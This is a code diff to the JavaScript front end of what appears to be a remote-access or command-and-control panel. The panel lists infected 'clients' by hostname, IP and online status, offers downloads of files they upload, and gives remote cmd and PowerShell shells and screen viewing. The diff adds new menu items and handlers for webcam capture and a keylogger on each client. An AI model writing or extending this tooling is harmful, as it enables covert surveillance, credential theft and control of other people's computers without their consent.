@@ -37,15 +37,8 @@ document.addEventListener('click', (e) => {
   if (!b) return;
   const el = $(b.dataset.reveal);
   const shown = el.dataset.shown === '1';
-  if (shown) {
-    el.textContent = '•'.repeat(el.dataset.real.length);
-    el.dataset.shown = '0';
-    b.textContent = 'reveal';
-  } else {
-    el.textContent = el.dataset.real;
-    el.dataset.shown = '1';
-    b.textContent = 'hide';
-  }
+  if (shown) { el.textContent = '•'.repeat(el.dataset.real.length); el.dataset.shown = '0'; b.textContent = 'reveal'; }
+  else { el.textContent = el.dataset.real; el.dataset.shown = '1'; b.textContent = 'hide'; }
 });
 
 document.querySelectorAll('.nav a').forEach((a) => {
@@ -102,12 +95,9 @@ function humanSize(n) {
   return `${(n / 1024 / 1024).toFixed(2)} MB`;
 }
 
-// ---------- HOSTS ----------
 async function loadHosts() {
   const s = state.hosts;
-  const q = new URLSearchParams({
-    status: s.status, q: s.q, limit: String(HOST_PAGE_SIZE), offset: String(s.offset),
-  });
+  const q = new URLSearchParams({ status: s.status, q: s.q, limit: String(HOST_PAGE_SIZE), offset: String(s.offset) });
   const r = await fetch('/api/clients?' + q);
   if (!r.ok) return;
   const d = await r.json();
@@ -115,11 +105,8 @@ async function loadHosts() {
 
   const host = $('h-rows');
   host.innerHTML = '';
-  if (d.rows.length === 0) {
-    host.innerHTML = '<div class="empty">no hosts</div>';
-  } else {
-    d.rows.forEach(c => host.appendChild(buildRow(c, () => openHostDetail(c))));
-  }
+  if (d.rows.length === 0) host.innerHTML = '<div class="empty">no hosts</div>';
+  else d.rows.forEach(c => host.appendChild(buildRow(c, () => openHostDetail(c))));
 
   const page = Math.floor(s.offset / HOST_PAGE_SIZE) + 1;
   const pages = Math.max(1, Math.ceil(d.total / HOST_PAGE_SIZE));
@@ -146,77 +133,59 @@ function buildRow(c, onOpen) {
 async function openHostDetail(c) {
   const box = $('h-detail');
   box.innerHTML = '';
-
   const el = document.createElement('div');
   el.className = 'detail';
   el.innerHTML = `
     <h3>${esc(c.hostname)}</h3>
     <div class="sub" style="margin:0;color:var(--green-2)">${esc(c.ip)}</div>
-
     <div class="kv">
       <div class="k">client id</div> <div class="v">${c.id}</div>
       <div class="k">state</div>     <div class="v plain" style="color:${c.online ? 'var(--green-2)' : 'var(--muted)'}">${c.online ? 'online' : 'offline'}</div>
       <div class="k">ipv4</div>      <div class="v">${esc(c.ip)}</div>
       <div class="k">last seen</div> <div class="v plain">${new Date(c.lastSeen).toLocaleString()}</div>
     </div>
-
     <div style="display:flex;gap:8px;margin-top:16px;flex-wrap:wrap">
       <button class="ghost mini" data-remote>go to remote</button>
       <button class="ghost mini" data-del style="border-color:var(--red);color:var(--red)">delete</button>
       <button class="ghost mini" data-close>close</button>
     </div>
-
     <h3 style="margin-top:20px">uploads</h3>
     <div id="u-list"><div class="note">loading…</div></div>`;
   box.appendChild(el);
-
   el.querySelector('[data-close]').addEventListener('click', () => box.innerHTML = '');
   el.querySelector('[data-remote]').addEventListener('click', () => {
     document.querySelector('.nav a[data-tab="remote"]')?.click();
-    state.remote.q = c.hostname;
-    $('r-search').value = c.hostname;
-    loadRemote();
+    state.remote.q = c.hostname; $('r-search').value = c.hostname; loadRemote();
   });
   el.querySelector('[data-del]').addEventListener('click', async () => {
     if (!confirm(`delete ${c.hostname}?`)) return;
     const r = await fetch(`/api/clients/${c.id}`, { method: 'DELETE' });
     if (r.ok) { box.innerHTML = ''; loadHosts(); }
   });
-
   await loadUploads(c.id, el.querySelector('#u-list'));
 }
 
 async function loadUploads(clientId, container) {
   const r = await fetch(`/api/clients/${clientId}/uploads`);
-  if (!r.ok) { container.innerHTML = '<div class="note">failed to load</div>'; return; }
+  if (!r.ok) { container.innerHTML = '<div class="note">failed</div>'; return; }
   const rows = await r.json();
   container.innerHTML = '';
-  if (rows.length === 0) {
-    container.innerHTML = '<div class="note">no uploads yet.</div>';
-    return;
-  }
+  if (rows.length === 0) { container.innerHTML = '<div class="note">no uploads.</div>'; return; }
   rows.forEach(u => {
     const el = document.createElement('div');
     el.className = 'upload-row';
     el.innerHTML = `
-      <div>
-        <div class="name">${esc(u.filename)}</div>
-        <div class="meta">${new Date(u.created_at).toLocaleString()} · ${humanSize(u.size)}</div>
-      </div>
+      <div><div class="name">${esc(u.filename)}</div>
+      <div class="meta">${new Date(u.created_at).toLocaleString()} · ${humanSize(u.size)}</div></div>
       <button class="ghost mini" data-dl>download</button>`;
-    el.querySelector('[data-dl]').addEventListener('click', () => {
-      location.href = `/api/uploads/${u.id}/download`;
-    });
+    el.querySelector('[data-dl]').addEventListener('click', () => { location.href = `/api/uploads/${u.id}/download`; });
     container.appendChild(el);
   });
 }
 
-// ---------- REMOTE ----------
 async function loadRemote() {
   const s = state.remote;
-  const q = new URLSearchParams({
-    status: 'online', q: s.q, limit: String(REMOTE_PAGE_SIZE), offset: String(s.offset),
-  });
+  const q = new URLSearchParams({ status: 'online', q: s.q, limit: String(REMOTE_PAGE_SIZE), offset: String(s.offset) });
   const r = await fetch('/api/clients?' + q);
   if (!r.ok) return;
   const d = await r.json();
@@ -224,11 +193,8 @@ async function loadRemote() {
 
   const host = $('r-rows');
   host.innerHTML = '';
-  if (d.rows.length === 0) {
-    host.innerHTML = '<div class="empty">no online clients</div>';
-  } else {
-    d.rows.forEach(c => host.appendChild(buildRemoteRow(c)));
-  }
+  if (d.rows.length === 0) host.innerHTML = '<div class="empty">no online clients</div>';
+  else d.rows.forEach(c => host.appendChild(buildRemoteRow(c)));
 
   const page = Math.floor(s.offset / REMOTE_PAGE_SIZE) + 1;
   const pages = Math.max(1, Math.ceil(d.online / REMOTE_PAGE_SIZE));
@@ -236,7 +202,6 @@ async function loadRemote() {
   $('r-prev').disabled = s.offset === 0;
   $('r-next').disabled = s.offset + REMOTE_PAGE_SIZE >= d.online;
 }
-
 
 function buildRemoteRow(c) {
   const el = document.createElement('div');
@@ -249,19 +214,15 @@ function buildRemoteRow(c) {
     <span class="actions" style="position:relative">
       <button class="ghost mini" data-gear title="actions" style="font-size:14px;padding:4px 10px">⚙</button>
     </span>`;
-
   el.querySelector('[data-gear]').addEventListener('click', (e) => {
     e.stopPropagation();
     openGearMenu(e.currentTarget, c);
   });
-
   return el;
 }
 
 let gearMenuEl = null;
-function closeGearMenu() {
-  if (gearMenuEl) { gearMenuEl.remove(); gearMenuEl = null; }
-}
+function closeGearMenu() { if (gearMenuEl) { gearMenuEl.remove(); gearMenuEl = null; } }
 document.addEventListener('click', closeGearMenu);
 
 function openGearMenu(anchor, c) {
@@ -271,18 +232,21 @@ function openGearMenu(anchor, c) {
   menu.style.cssText = `
     position: fixed;
     top: ${rect.bottom + 4}px;
-    left: ${rect.right - 200}px;
+    left: ${rect.right - 220}px;
     background: linear-gradient(180deg, #0b2313, #071a0e);
     border: 1px solid var(--line-2);
     border-radius: 8px;
     padding: 6px;
-    min-width: 200px;
+    min-width: 220px;
     z-index: 9999;
     box-shadow: 0 12px 32px rgba(0,0,0,.7);
   `;
   menu.innerHTML = `
     <div style="padding:6px 10px 4px;font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted)">${esc(c.hostname)}</div>
     <div data-item="rdp"    style="padding:9px 12px;cursor:pointer;border-radius:5px;font-size:13px">screen (rdp)</div>
+    <div data-item="webcam" style="padding:9px 12px;cursor:pointer;border-radius:5px;font-size:13px">webcam</div>
+    <div data-item="keylog" style="padding:9px 12px;cursor:pointer;border-radius:5px;font-size:13px">keylogger</div>
+    <div style="height:1px;background:var(--line);margin:5px 4px"></div>
     <div data-item="cmd"    style="padding:9px 12px;cursor:pointer;border-radius:5px;font-size:13px">remote shell — cmd</div>
     <div data-item="ps"     style="padding:9px 12px;cursor:pointer;border-radius:5px;font-size:13px">remote shell — powershell</div>
   `;
@@ -294,6 +258,8 @@ function openGearMenu(anchor, c) {
       closeGearMenu();
       const it = el.dataset.item;
       if (it === 'rdp') openRdp(c);
+      else if (it === 'webcam') openWebcam(c);
+      else if (it === 'keylog') openKeylog(c);
       else if (it === 'cmd') openConsole(c, 'cmd');
       else if (it === 'ps') openConsole(c, 'powershell');
     });
@@ -302,26 +268,26 @@ function openGearMenu(anchor, c) {
   gearMenuEl = menu;
 }
 
-function openRdp(c) {
-  const q = new URLSearchParams({
-    id: String(c.id),
-    host: c.hostname || '',
-    ip: c.ip || '',
-  });
-  window.open('/rdp.html?' + q.toString(), '_blank', 'width=1200,height=760');
-}
-
 function openConsole(c, shell) {
-  const q = new URLSearchParams({
-    id: String(c.id),
-    host: c.hostname || '',
-    ip: c.ip || '',
-    shell: shell || 'cmd',
-  });
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', shell: shell || 'cmd' });
   window.open('/cmd.html?' + q.toString(), '_blank', 'width=1000,height=640');
 }
 
-// ---------- toolbar wiring ----------
+function openRdp(c) {
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
+  window.open('/rdp.html?' + q.toString(), '_blank', 'width=1200,height=760');
+}
+
+function openWebcam(c) {
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
+  window.open('/webcam.html?' + q.toString(), '_blank', 'width=1000,height=700');
+}
+
+function openKeylog(c) {
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
+  window.open('/keylog.html?' + q.toString(), '_blank', 'width=1000,height=700');
+}
+
 function debounce(fn, ms) { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; }
 
 $('h-search').addEventListener('input', debounce((e) => { state.hosts.q = e.target.value; state.hosts.offset = 0; loadHosts(); }, 220));
@@ -335,7 +301,6 @@ $('r-refresh').addEventListener('click', () => { state.remote.offset = 0; loadRe
 $('r-prev').addEventListener('click', () => { state.remote.offset = Math.max(0, state.remote.offset - REMOTE_PAGE_SIZE); loadRemote(); });
 $('r-next').addEventListener('click', () => { state.remote.offset += REMOTE_PAGE_SIZE; loadRemote(); });
 
-// ---------- settings ----------
 $('whtest').addEventListener('click', async () => {
   $('wherr').textContent = '';
   const r = await fetch('/api/webhook/test', {
